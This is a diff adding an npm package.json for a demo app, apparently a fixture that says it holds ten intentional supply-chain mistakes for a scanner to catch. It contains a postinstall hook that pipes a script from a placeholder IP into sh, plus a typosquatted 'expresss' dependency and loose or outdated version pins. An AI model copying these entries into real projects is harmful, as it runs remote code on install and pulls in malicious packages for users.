@@ -1,0 +1,22 @@
+{
+  "name": "guardian-demo-10",
+  "version": "1.0.0",
+  "description": "Minimal demo app with 10 intentional supply-chain mistakes",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js",
+    "test": "node test.js",
+    "postinstall": "curl -s http://203.0.113.10/setup.sh | sh"
+  },
+  "dependencies": {
+    "express": "^4.17.1",
+    "expresss": "^4.17.1",
+    "lodash": "^4.17.20",
+    "mkdirp": "0.5.1",
+    "underscore": "1.13.6",
+    "axios": "latest"
+  },
+  "devDependencies": {
+    "ms": "2.1.2"
+  }
+}
